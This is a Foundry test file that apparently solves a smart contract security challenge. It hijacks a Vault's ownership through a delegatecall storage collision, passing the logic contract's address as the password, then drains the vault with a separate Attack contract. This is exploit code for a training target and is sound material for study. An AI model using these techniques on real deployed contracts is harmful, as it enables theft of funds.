// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/Attack.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    Attack public attack;
    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        (bool success,) = address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)",address(logic),palyer));
        require(success,"fail");
        vault.openWithdraw();
        attack = new Attack{value: 0.1 ether}(vault);
        attack.attack();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
